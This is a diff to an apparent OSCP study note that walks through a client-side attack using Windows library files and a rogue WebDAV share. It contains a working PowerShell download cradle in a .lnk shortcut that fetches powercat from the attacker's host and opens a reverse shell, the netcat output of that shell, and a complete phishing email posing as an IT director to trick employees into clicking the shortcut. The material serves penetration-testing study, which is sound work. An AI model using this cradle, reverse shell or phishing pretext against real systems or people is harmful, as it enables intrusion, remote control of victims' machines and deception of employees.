@@ -208,12 +208,87 @@ We're going to use VSCode to create our library file. And to any of you reading 
 Save the file to your Desktop, then double click it on the Desktop. If it worked, then we should see our `test.txt` file from our rogue WebDAV share!
 ![](../oscp-pics/abusing-library-files-3.png)
 ## Issues
-After testing our successful connection back to our WebDAV share, if we open the file again using VSCode, we'll see that the Windows machine *modified it*. There is now a `<serialized>` tag and the url in our `<url>` tag has changed. This is because Windows is trying to optimize the connection to our share for the *Windows WebDAV client*. 
+After testing our successful connection back to our WebDAV share, if we open the file again using VSCode, we'll see that the Windows machine *modified it*. There is now a `<serialized>` tag and the url in our `<url>` tag has changed. This is because Windows is trying to optimize the connection to our share for the *Windows WebDAV client*. Mine now looks like this:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
+  <name>@windows.storage.dll,-34582</name>
+  <version>8</version>
+  <isLibraryPinned>true</isLibraryPinned>
+  <iconReference>imageres.dll,-1003</iconReference>
+  <templateInfo>
+    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+  </templateInfo>
+  <searchConnectorDescriptionList>
+    <searchConnectorDescription>
+      <isDefaultSaveLocation>true</isDefaultSaveLocation>
+      <isSupported>false</isSupported>
+      <simpleLocation>
+        <url>\\192.168.45.232\DavWWWRoot</url>
+        <serialized>MBAAAEAFCAAAAAAAADAAAAAAAYkg<REALLY LONG BASE64>AAAAAAAAA</serialized>
+      </simpleLocation>
+    </searchConnectorDescription>
+  </searchConnectorDescriptionList>
+</libraryDescription>
+```
 
 Our library file will still work, *but it may not work on other machines* or after the user *restarts their computer*. If this happens, our exploit may fail because Windows Explorer will at that point be showing the user an empty WebDAV share. The only way to fix this is by modifying the file and pasting in the original content, which is kind of a PITA. Fortunately, we really only need to victim to double-click our file once.
-## Delivery to the Victim
+## Stage Two: Shortcut File
+Reset the `tiddies.library-ms` file to its original state. Now, we're moving on to stage two: creating the shortcut file. Basically, this shortcut file will exist in our WebDAV share and we're hoping once the victim opens the share (via the library), they'll click on the shortcut file. Once they do, the shortcut will execute a reverse shell for us.
+### Creating the Shortcut File
+[.LNK](../../computers/windows/LNK.md) files (`.lnk`) are metadata files specific to [Windows](../../computers/windows/README.md) and can be interpreted by the Windows Shell. It's used primarily for creating link "shortcuts" to files and applications in the filesystem. 
 
+We can use a `.lnk` file to link to our exploit which will be another [powershell](../../computers/windows/powershell.md) [download cradle](../../cybersecurity/TTPs/actions-on-objective/download-cradles.md). Right click the Desktop and click New --> Shortcut. In the window that pops up, we're going to enter a *path to a program* as well as *arguments*. Let's use powershell as our program and a download cradle as our arguments. For reference, this will be our cradle:
+```powershell
+powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.232:8000/powercat.ps1');powercat -c 192.168.45.232 -p 44444 -e powershell"
+```
+![](../oscp-pics/abusing-library-files-4.png)
+#### Naming the shortcut file
+Once we hit Next, we'll be prompted to name our shortcut file. Let's name it "tits_mcgee", then click Finish.
+### Testing
+Make sure [netcat](../../cybersecurity/TTPs/exploitation/tools/netcat.md) and our [python](../../coding/languages/python/python.md) [HTTP](../../www/HTTP.md) server are both listening. Python should be serving our `powercat.ps1` file. Once they're up, test the shortcut file by double clicking it on the desktop. If it's working, we should get some output in netcat:
+```bash
+┌─[25-04-21 15:16:52]:(root@192.168.45.232)-[/home/trshpuppy/oscp/client-side]
+└─# nc -nlvp 44444
+listening on [any] 44444 ...
+connect to [192.168.45.232] from (UNKNOWN) [192.168.112.194] 65501
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\Windows\System32\WindowsPowerShell\v1.0>
+```
+## Exploit
+Now that stage 1 and 2 are ready, let's turn this into a real attack. Realistically, we would have to deliver this probably via some kind of [social-engineering](../../cybersecurity/TTPs/delivery/social-engineering.md) ([phishing](../../cybersecurity/TTPs/delivery/phishing.md) or vishing) (yes I have sent a malicious document to a victim via email during a vishing call and convinced them to scan a QR code; there are a lot of possibilities). 
+### Get the Files Ready
+First, take `test.txt` our of our WebDAV share. Next, copy our `.lnk` file into the WebDAV share. Make sure you reset it to its origin content (before executing it on Windows). Next, start the python server on port `8000` to server `powercat.ps1`. Finally, start netcat listening on port 44444.
+### Delivering the Library file
+Normally, we would probably email the library file to the victim in a phishing email with a pretext that convinces them to download the file. Remember that the `<url>` tag in the library file is *pointing to our WebDAV share*. When the victim opens it on their machine, they should see our `.lnk`.
+
+Let's say the `.lnk` is named `auto-config`. It should look like this when they download the library file and open it:
+![](../oscp-pics/abusing-library-files-5.png)
+So we could use a pretext like:
+```markdown
+Good afternoon,
+
+We're rolling out a new security product from <INJECT RANDOM SECURITY COMPANY>. In case of any mis-configurations or bugs, we'll be rolling this out in staggered groups over the next week. If you're receiving this email, you're part of the first group.
+
+We will be adopting this product company-wide with a goal of completing implementation by the end of this month. So please be patient as we introduce this new system into our environment.
+
+STEPS
+1. Download the attached file
+2. Open the folder and click "auto_config"
+
+That's all you have to do! This will install the new software as if one of our IT staff were installing it manually on your computer.
+
+If you notice any issues, please respond to this email and include whatever details you can. Thank you.
+
+- Bobby Tables, Director of IT
+```
+Once the victim downloads the library file (disguised as a regular Documents folder via the `<iconReference>` tag) and double clicks our `auto_config` shortcut/`.lnk` file, we should see our reverse shell output from netcat.
 
 > [!Resources]
 > - [Microsoft: Windows Libraries](https://learn.microsoft.com/en-us/windows/client-management/client-tools/windows-libraries)
+> - [ForensicsWiki: Shortcut files](https://web.archive.org/web/20220519184752/https://forensicswiki.xyz/page/LNK) 
 > - [Microsoft: Library Description Schema](https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry)
